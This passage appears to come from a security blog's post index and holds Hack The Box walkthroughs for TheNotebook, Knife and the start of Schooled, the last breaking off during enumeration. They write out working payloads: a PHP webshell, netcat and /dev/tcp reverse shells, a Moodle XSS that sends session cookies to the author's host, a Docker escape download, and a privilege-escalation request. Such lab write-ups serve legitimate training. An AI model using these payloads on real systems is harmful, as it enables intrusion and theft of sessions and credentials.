in the python webserver by the backend, and we can now see the Admin Panel option while accessing the portal :smile:   python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...10.10.10.230 - - [10/Jun/2021 18:45:24] \"GET /privKey.key HTTP/1.1\" 200 -         Analyzing what we can do next with the permissions we have from an administrator perspective, we can see two options: list existing notes and upload a file.         Reviewing the content of existing notes, we were able to see all notes in the app, as the table below. Pay attention to the notes from admin which mentions an existing backup in the server as well as the ability to execute PHP files in the server:                  Title       Note       Owner                       Need to fix config       Have to fix this issue where PHP files are being executed :/. This can be a potential security issue for the server.       admin                 Backups are scheduled       Finally! Regular backups are necessary. Thank god it’s all easy on server.       admin                 The Notebook Quotes       “I am nothing special, of this I am sure. I am a common man with common thoughts and I’ve led a common life. There are no monuments dedicated to me and my name will soon be forgotten, but I’ve loved another with all my heart and soul, and to me, this has always been enough..” ― Nicholas Sparks, The Notebook “So it’s not gonna be easy. It’s going to be really hard; we’re gonna have to work at this everyday, but I want to do that because I want you. I want all of you, forever, everyday. You and me… everyday.” ― Nicholas Sparks, The Notebook “You can’t live your life for other people. You’ve got to do what’s right for you, even if it hurts some people you love.” ― Nicholas Sparks, The Notebook “You are, and always have been, my dream.” ― Nicholas Sparks, The Notebook “You are my best friend as well as my lover, and I do not know which side of you I enjoy the most. I treasure each side, just as I have treasured our life together.” ― Nicholas Sparks, The Notebook “I love you. I am who I am because of you. You are every reason, every hope, and every dream I’ve ever had, and no matter what happens to us in the future, everyday we are together is the greatest day of my life. I will always be yours. “ ― Nicholas Sparks, The Notebook “We fell in love, despite our differences, and once we did, something rare and beautiful was created. For me, love like that has only happened once, and that’s why every minute we spent together has been seared in my memory. I’ll never forget a single moment of it.” ― Nicholas Sparks, The Notebook       noah                 Is my data safe?       I wonder is the admin good enough to trust my data with?       noah           Once we could possibly upload and run PHP files, decided to make a test, following the steps below:           Accessing the File Upload we have a simple page to post our files, where we’re going to inspect the requests using burp.                              Creating a simple webshell with the content &lt;?php system($_GET['cmd']);?&gt;, made its upload and didn’t received any warning or block during the action.                        After uploading it, the file was listed on the page, and hitting the View butting, we were redirected to the path where the file was, allowing us to see the rendered content.                                 Adding a simple query string at its end, as expected by our simple web shell, to run the id command (cmd=id) and we could confirm that we have code execution in the server :smiley:                         To get a reverse shell, configured a listener and then sent another payload, this time to get a TCP connection from the server, which worked as expected :smile:           GET /1e49f8a12603040cc99b2dd39f423b09.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.10.10+4443+&gt;/tmp/f HTTP/1.1 Host: 10.10.10.230 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg; uuid=d3f32390-d9e4-4eb0-b1a0-788b54fd8278 Connection: close   User flag   After obtaining the reverse shell, started enumerating the box with the account www-data, which is the one used by the web server execution. The following items stood out from the others listed during linpeas.sh execution:           Users with console and their permissions              noah:x:1000:1000:Noah:/home/noah:/bin/bash       root:x:0:0:root:/root:/bin/bash                Existence of /var/backups folder, also mentioned in the previously seen notes.       As this was previously mentioned, started by inspecting the contents of /var/backups, where most of the files we couldn’t read except for the home.tar.gz, which could have some interesting information.   www-data@thenotebook:/var/backups$ ls -la total 696 drwxr-xr-x  2 root root     4096 Jun 11 06:26 . drwxr-xr-x 14 root root     4096 Feb 12 06:52 .. -rw-r--r--  1 root root    51200 Jun 11 06:25 alternatives.tar.0 -rw-r--r--  1 root root    33252 Feb 24 08:53 apt.extended_states.0 -rw-r--r--  1 root root     3609 Feb 23 08:58 apt.extended_states.1.gz -rw-r--r--  1 root root     3621 Feb 12 06:52 apt.extended_states.2.gz -rw-r--r--  1 root root      437 Feb 12 06:17 dpkg.diversions.0 -rw-r--r--  1 root root      172 Feb 12 06:52 dpkg.statoverride.0 -rw-r--r--  1 root root   571460 Feb 24 08:53 dpkg.status.0 -rw-------  1 root root      693 Feb 17 13:18 group.bak -rw-------  1 root shadow    575 Feb 17 13:18 gshadow.bak -rw-r--r--  1 root root     4373 Feb 17 09:02 home.tar.gz -rw-------  1 root root     1555 Feb 12 06:24 passwd.bak -rw-------  1 root shadow   1024 Feb 12 07:33 shadow.bak   Expanding the archive, noticed that the folder structure was from noah’s home directory, including some ssh keys that might be useful.   $ tar -xzvf home.tar.gz home/ home/noah/ home/noah/.bash_logout home/noah/.cache/ home/noah/.cache/motd.legal-displayed home/noah/.gnupg/ home/noah/.gnupg/private-keys-v1.d/ home/noah/.bashrc home/noah/.profile home/noah/.ssh/ home/noah/.ssh/id_rsa home/noah/.ssh/authorized_keys home/noah/.ssh/id_rsa.pub   Using the key found, was able to connect using SSH as noah and retrieve the user flag.   $ ssh -i id_rsa noah@10.10.10.230 noah@thenotebook:~$ cat user.txt &lt;redacted&gt;   Root flag   As usual, before giving another try with linenum.sh with different privileges, ran sudo -l which returned the following content:   noah@thenotebook:~$ sudo -l Matching Defaults entries for noah on thenotebook:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User noah may run the following commands on thenotebook:     (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*   As we have access to run any command in the docker container with exec, began by entering in an interactive shell as the command below.   sudo /usr/bin/docker exec -it webapp-dev01 bash   Inside the container, was able to see the files used while publishing the website, where we can look for sensitive information   root@7228ddf52a0f:/opt/webapp# ls -la total 2244 drwxr-xr-x 1 root root    4096 Jun 11 07:04 . drwxr-xr-x 1 root root    4096 Feb 12 07:30 .. drwxr-xr-x 1 root root    4096 Feb 12 07:30 __pycache__ drwxr-xr-x 3 root root    4096 Nov 18  2020 admin -rw-r--r-- 1 root root    3303 Nov 16  2020 create_db.py -rwxr-xr-x 1 root root 2236814 Jun 11 07:04 main -rw-r--r-- 1 root root    9517 Feb 11 15:00 main.py -rw------- 1 root root    3247 Feb 11 15:09 privKey.key -rw-r--r-- 1 root root      78 Feb 12 07:12 requirements.txt drwxr-xr-x 3 root root    4096 Nov 19  2020 static drwxr-xr-x 2 root root    4096 Nov 18  2020 templates -rw-r--r-- 1 root root      20 Nov 20  2020 webapp.tar.gz   Checking the content of these files, in create_db.py noticed two password hashes for users noah and admin, which I decided to search on the internet first if they have already been cracked.    users = [         User(username='admin', email='admin@thenotebook.local', uuid=admin_uuid, admin_cap=True, password=\"0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68\"),         User(username='noah', email='noah@thenotebook.local', uuid=noah_uuid, password=\"e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2\")     ]   As haven’t found anything in public sites (Crackstation, for example) this means that these passwords are not present in known wordlists like rockyou.txt, frequently used in CTFs. Decided to go further enumerating for other vulnerabilities in docker, specifically docker breakout, allowing us to escape to the host.   Searching for some information, found the repo stealthcopter/deepce: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) (github.com) where there’s a script that can help us enumerate the container characteristics known to be helpful in this kind of situation.   Executing it in the container, noticed that we could have a chance on doing it as there were capabilities (in red) that could allow us to read and write files in the host, but using the options in the tool didn’t allow me to achieve the expected outcome.      As I haven’t found anything in the files, decided to search for specific vulnerabilities that could abuse capabilities like the ones we have found, where I found about CVE-2019-5736 while browsing for docker vulns in CVE Details. This vuln represents exactly the type of abuse we need based on our situation and, due to its high CVSS score (9.3) probably there is a ready exploit to be used.      Searching for exploits I came across the repo Frichetten/CVE-2019-5736-PoC: PoC for CVE-2019-5736 (github.com) which had a PoC written in Golang that supposedly would attend to our scenario, while other PoCs found required us to be able to run other containers (docker run) in the host, not covered by our sudo privileges.   To obtain the root shell, the following steps were executed, as also seen in this blog post (Reproduction of docker escape vulnerability (CVE-2019-5736) - Programmer Sought)           Downloaded and edited the script escape.go to give us a reverse shell.            Compiled it using the parameters below       CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build escape.go      Copied the exploit to the victim machine, inside the container, followed by its execution   wget http://10.10.10.10/escape chmod +x escape ./escape      Once the exploit replaces the file /bin/sh with the malicious script, execute the command line below to trigger the exploration   sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh   After this execution, was received a reverse shell in the listener previously configured and was able to get the root’s flag   $ sudo nc -lnvp 8080 listening on [any] 8080 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.230] 35856 bash: cannot set terminal process group (1617): Inappropriate ioctl for device bash: no job control in this shell &lt;4de4eaff90e275467ff2103ff7b6eb2b1ffaf63d44f72a2b2# id id uid=0(root) gid=0(root) groups=0(root) root@thenotebook:/root# cat root.txt \\cat root.txt &lt;redacted&gt;   I hope you guys have enjoyed it!   See you in the next post :smiley:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Medium","HTB Linux"],
        "url": "/walkthrough/2021/07/htb-thenotebook",
        "teaser": "https://i.imgur.com/Arm1Pyr.png"
      },{
        "title": "Walktrough: HTB Knife",
        "excerpt":"Hello guys!   This week’s machine will be Knife, another easy-rated Linux box from Hack The Box, created by MrKN16H.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      This was a pretty straightforward box where you must pay attention to the details (in the case of the vulnerable web server) and always go for the low-hanging fruits first like abusing the sudo permissions user already have.   I hope you guys enjoy it!   Enumeration   As usual, started with a quick nmap scan to check the published services on this box:   $ nmap -sC -sV -Pn -oA quick 10.10.10.242 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 17:50 -03 Nmap scan report for 10.10.10.242 Host is up (0.072s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) |   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA) |_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title:  Emergent Medical Idea Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.42 seconds   80/TCP - HTTP Service   Accessing the website we can see a simple institutional page from a health company, as below:      After accessing the website, gathered some information about the page, its components, and the server from which it was published using whatweb, and what called attention was the X-Powered-By header pointing to a dev version of PHP 8.1.0.   $ whatweb --color=never -a 3 10.10.10.242 | tee whatweb.txt http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], , Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]   Initial Access and User flag   As dev versions often contain vulnerabilities, decided to search it using searchsploit and found an RCE vulnerability as listed below:   $ searchsploit \"8.1.0-dev\" ---------------------------------------------------------------------- ----------------------------  Exploit Title                                                        |  Path ---------------------------------------------------------------------- ---------------------------- PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                   | php/webapps/49933.py ---------------------------------------------------------------------- ---------------------------- Shellcodes: No Results   This vulnerability consists in a backdor which was added in some commits of PHP source code by compromised accounts and, when a request arrives with a header User-Agentt: \"zerodiumsystem('cmd');\", the cmd will be interpreted and executed in the system. The payload available emulate a non-interactive shell and, from it, started an interactive session using the payload bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4443 0&gt;&amp;1' which returned a session from james’s user account, where in his home directory I was able to read the contents of user.txt, obtaining the first flag.   james@knife:~$ id &amp;&amp; hostname uid=1000(james) gid=1000(james) groups=1000(james) knife james@knife:~$ cat user.txt &lt;redacted&gt;   Root flag   As usual, started with the command sudo -l and we were lucky once again, as output below:   james@knife:~$ sudo -l Matching Defaults entries for james on knife:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User james may run the following commands on knife:    (root) NOPASSWD: /usr/bin/knife                 Doing a quick search on this binary, found out that it’s related to Chef’s Configuration Management Solution and, according to knife | GTFOBins page, could be easily used to privesc to root, as below, allowing us to get the final flag :smiley:   james@knife:~$ sudo /usr/bin/knife --help                                                                                 Chef Infra Client: 16.10.8  Docs: https://docs.chef.io/workstation/knife/ Patents: https://www.chef.io/patents  [...]  james@knife:~$ sudo /usr/bin/knife exec -E 'exec \"/bin/sh\"' # cat root.txt &lt;redacted&gt;   I hope you guys have enjoyed!   See you at the next post :smile:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Easy","HTB Linux"],
        "url": "/walkthrough/2021/08/htb-knife",
        "teaser": "https://i.imgur.com/U5A7c9y.png"
      },{
        "title": "Walktrough: HTB Schooled",
        "excerpt":"Hello guys!   This week’s machine will be Schooled, another medium-rated Linux box from Hack The Box, created by TheCyberGeek.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      To solve this box, I was required to exploit two CVEs for a vulnerable Moodle Version, which was the hardest part once the PoC available didn’t work and spent some time understanding the required steps and then getting the initial foothold. After that, all went fine, obtaining creds from Moodle database and then abusing over-permissive sudo configurations.   I hope you guys enjoy it!   Enumeration   As usual, started by running a nmap quick scan to see which services are currently published   $ nmap -sC -sV -Pn -oA quick 10.10.10.234 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 14:41 -03 Nmap scan report for 10.10.10.234 Host is up (0.077s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) | ssh-hostkey: |   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA) |   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA) |_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519) 80/tcp open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) | http-methods: |_  Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 |_http-title: Schooled - A new kind of educational institute Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds   In parallel, after the initial scan, was also able to enumerate the port 33060/TCP, resulting in the following output:   $ nmap -p 80,33060 -A -oA Full 10.10.10.234                                                                                      Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 14:57 -03 Nmap scan report for schooled.htb (10.10.10.234) Host is up (0.077s latency).  PORT      STATE SERVICE VERSION 80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) | http-methods: |_  Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 |_http-title: Schooled - A new kind of educational institute 33060/tcp open  mysqlx? | fingerprint-strings: |   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: |     Invalid message\" |     HY000 |   LDAPBindReq: |     *Parse error unserializing protobuf message\" |     HY000 |   oracle-tns: |     Invalid message-frame.\" |_    HY000 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.91%I=7%D=8/1%Time=6106E084%P=x86_64-pc-linux-gnu%r(NU SF:LL,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(GenericLines,9,\"\\x05\\0\\0\\0\\x0b\\x SF:08\\x05\\x1a\\0\")%r(GetRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(HTTPOpt SF:ions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(RTSPRequest,9,\"\\x05\\0\\0\\0\\x0b\\ SF:x08\\x05\\x1a\\0\")%r(RPCCheck,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSVersi SF:onBindReqTCP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSStatusRequestTCP,2B SF:,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fIn SF:valid\\x20message\\\"\\x05HY000\")%r(Help,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")% SF:r(SSLSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\ SF:x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(TerminalServerCookie, SF:9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TLSSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x0 SF:8\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\ SF:x05HY000\")%r(Kerberos,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SMBProgNeg,9, SF:\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(X11Probe,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x SF:1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY00 SF:0\")%r(FourOhFourRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LPDString,9 SF:,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LDAPSearchReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08 SF:\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x SF:05HY000\")%r(LDAPBindReq,46,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\x009\\0\\0\\0\\x01\\x SF:08\\x01\\x10\\x88'\\x1a\\*Parse\\x20error\\x20unserializing\\x20protobuf\\x20mes SF:sage\\\"\\x05HY000\")%r(SIPOptions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LAND SF:esk-RC,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TerminalServer,9,\"\\x05\\0\\0\\0 SF:\\x0b\\x08\\x05\\x1a\\0\")%r(NCP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NotesRPC SF:,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0 SF:fInvalid\\x20message\\\"\\x05HY000\")%r(JavaRMI,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1 SF:a\\0\")%r(WMSRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(oracle-tns,32,\"\\ SF:x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0%\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x16Invalid\\ SF:x20message-frame\\.\\\"\\x05HY000\")%r(ms-sql-s,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1 SF:a\\0\")%r(afp,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\ SF:x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\");  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds   80/TCP - HTTP Service   Accessing this initial page, we can see an institutional page of a School, which also mentions that all content is delivered using Moodle, that we might need to find it to dig a little further on it.      Also, by running whatweb I have found an e-mail address admissions@schooled.htb where schooled.htb might be the domain name for this machine, which was later added to the hosts file.   $ whatweb --color=never -a 3 10.10.10.234 http://10.10.10.234 [200 OK] Apache[2.4.46], Bootstrap[4.1.0], Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]   While left gobuster running in the background to check other pages in the site, started another instance enumerating subdomains and have found both moodle and student, also later added to the local hosts file.   $ gobuster dns -d schooled.htb -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Domain:     schooled.htb [+] Threads:    10 [+] Timeout:    1s [+] Wordlist:   /usr/share/dnsrecon/subdomains-top1mil-5000.txt =============================================================== 2021/08/01 17:24:31 Starting gobuster in DNS enumeration mode =============================================================== Found: moodle.schooled.htb Found: student.schooled.htb  =============================================================== 2021/08/01 17:25:04 Finished ===============================================================   The subdomain student.schooled.htb was redirecting to the main page while moodle.schooled.htb was redirecting to the page below, a Moodle site that could allow us to gather some additional information, allowing us to have an initial foothold or even an RCE based on existing vulnerabilities.      Starting with Moodle site enumeration, ran moodlescan, a script that helps us to enumerate Moodle version, which returned 3.9.0-beta as output below.   $ python3 moodlescan.py -u http://moodle.schooled.htb/moodle  Version 0.8 - May/2021 .............................................................................................................  By Victor Herrera - supported by www.incode.cl  .............................................................................................................  Getting server information http://moodle.schooled.htb/moodle ...  server          : Apache/2.4.46 (FreeBSD) PHP/7.4.15 x-powered-by    : PHP/7.4.15 x-frame-options : sameorigin last-modified   : Mon, 02 Aug 2021 11:54:53 GMT  Getting moodle version...  Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta  Searching vulnerabilities...   Vulnerabilities found: 0  Scan completed.   Considering this version, did a quick search on the version. Found out that several vulnerabilities were present but would require some permissions that I still don’t have. So decided to proceed on creating an account to poke a little inside the platform, considering that nothing was available for guests.   While creating the account, noticed a requirement for an e-mail account from student.schooled.htb subdomain, previously enumerated using gobuster dns.   Besides the e-mail domain requirement, e-mail validation wasn’t required and with access to the platform started to browse the contents, to which I was only able to self-enroll to Mathematics class, where was found the following announcement:      Reminder for joining students by Manuel Phillips - Wednesday, 23 December 2020, 12:01 AM Number of replies: 0 This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.     Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.     Look forward to seeing you all soon.     Manuel Phillips    This means that teacher Manuel Philips will check all MoodleNet profiles for all enrolled students and, in case we can store an XSS on it, we might be able to steal the teacher’s session and enumerate further the platform while searching for an RCE opportunity.   Initial access   Searching for MoodleNet XSS, I came across a Security Announcement from Moodle mentioning the CVE-2020-25627, which was fixed in version 3.9.2 and affected versions 3.9 and 3.9.1, that matches our scenario.   Searching for a PoC for the related CVE, found the repo HoangKien1020/CVE-2020-25627: Stored XSS via moodlenetprofile parameter in user profile (github.com) containing the instructions to exploit it, which was implemented and permitted us to obtain teacher’s session cookie as evidence below:      Logged as the recently created user and modified the MoodleNet profile with the following content   &lt;script&gt;var i=new Image;i.src=\"http://10.10.10.10/xss.php?\"+document.cookie;&lt;/script&gt;      Hosted the xss.php in a folder and started a local PHP webserver, which 2 minutes later displayed us the teacher’s cookie on the page   $ sudo php -S 0.0.0.0:80 -t . [Mon Aug  9 14:44:05 2021] PHP 7.4.21 Development Server (http://0.0.0.0:80) started [Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 Accepted [Mon Aug  9 14:45:28 2021] PHP Notice:  Undefined index: METHOD in /opt/dcruz/htb/schooled-10.10.10.234/exploit/www/xss.php on line 28 [Mon Aug  9 14:45:28 2021] PHP Notice:  Undefined index: REMOTE_HOST in /opt/dcruz/htb/schooled-10.10.10.234/exploit/www/xss.php on line 29 [Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 [200]: GET /xss.php?MoodleSession=d8so1t4rs4vmg8btrgfr2ps6fr [Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 Closing    Now aware of this Session parameter, changed it in browser and we can now see in the upper right corner that I’m connected as Manuel Philips      Now that I have a more privileged access as a teacher, we need to check if current permissions (Teacher) are enough to get an RCE.   Searching about Moodle Exploitation on Moodle - HackTricks page, found out that I need to be a manager to upload a plugin, which can host malicious code to our purpose. Besides not having the appropriate permission noticed that version is also vulnerable to a Privilege Escalation Vulnerability, which could allow me to get manager permission in the course abusing the enrollment process and, if a student is the Site Manager, I could impersonate him and upload the malicious plugin, obtaining RCE. The same author of the other CVE has also a repository in Github containing a PoC that could help us to escalate those privileges and get RCE.   Besides not working well in our scenario, understanding the steps required used in the exploit, the following steps were executed to be able to get RCE:      The first thing would identify who in the platform could have manager permissions. Based on the institutional page, Lianne Carter is the school’s manager and possibly has the rights we need.   Also took note of Manuel Philips’ Profile id, which was obtained from his profile page at http://moodle.schooled.htb/moodle/user/profile.php?id=24.   Things started by enrolling the school’s manager in the class and, intercepting the request and sending a copy of it to Burp’s Repeater, also crafted a request granting us Manager Administration in the course, by assigning us the roleid=1 in the request, as well as changing the assignee id to Manuel Philips, the same way as seen in the PoC video.   GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&amp;id=5&amp;action=enrol&amp;enrolid=10&amp;sesskey=KbJYqTapFc&amp;_qf__enrol_manual_enrol_users_form=1&amp;mform_showmore_id_main=0&amp;userlist%5B%5D=24&amp;roletoassign=1&amp;startdate=4&amp;duration= HTTP/1.1 Host: moodle.schooled.htb Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Content-Type: application/json Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: MoodleSession=jil2s8i0vj0gq3vojfki6e7rtq Connection: close           Now as a course administrator, accessing a user’s profile, we can see the “Log in as” link, which permitted us to impersonate Lianne Carter.                   Now as Lianne, we were supposed to be able to upload the plugin directly but, as this option isn’t enabled in their tenant, we needed to first edit the Role permissions to allow this. Navigated to Site Administration pane &gt; Users and then, under Permissions, selected Define roles.                   Selected the Manager role and, after clicking in the “Edit” Button, intercepted the request, and appended the payload for full permissions, as shared also in the previously used script repo.                          Now, navigating to Site Administration &gt; Plugins we can see the Install Plugins option, where the rce.zip also available in the portal was available, which was uploaded with success, and allowed us to obtain RCE by calling the URL below, later changed to get a reverse shell       $ curl -X GET -G 'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php' --data-urlencode 'cmd=id' uid=80(www) gid=80(www) groups=80(www)  $ curl -X GET -G 'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php' --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f'   User Flag   Now with www-data account, started enumerating box. As usual decided to automate the task using linpeas.sh but found out that wget and curl were not available, so I wrote a simple php script that downloads a file from a webserver and then ran the script   echo \"&lt;?php\" &gt; wget.php echo \"\\$url = 'http://10.10.10.10/linpeas.sh';\" &gt;&gt; wget.php echo \"\\$file = '/tmp/linpeas.sh';\" &gt;&gt; wget.php echo \"\\$current = file_get_contents(\\$url);\" &gt;&gt; wget.php echo \"file_put_contents(\\$file, \\$current);\" &gt;&gt; wget.php echo \"?&gt;\" &gt;&gt; wget.php  /usr/local/bin/php wget.php   From the execution, the following information was obtained:      Users with console and their permissions:   jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh root:*:0:0:Charlie &amp;:/root:/bin/csh steve:*:1002:1002:User &amp;:/home/steve:/bin/csh      Moodle Database 